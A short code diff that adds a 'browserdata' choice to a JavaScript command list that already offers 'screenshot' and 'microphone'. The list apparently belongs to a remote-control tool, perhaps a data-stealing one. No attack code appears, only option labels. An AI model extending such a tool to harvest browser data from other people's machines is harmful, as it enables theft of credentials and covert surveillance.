@@ -29,6 +29,10 @@ export const commands = [
                         value: 'screenshot',
                     },
                     {
+                        name: 'browserdata',
+                        value: 'browserdata',
+                    },
+                    {
                         name: 'microphone',
                         value: 'microphone',
                     },
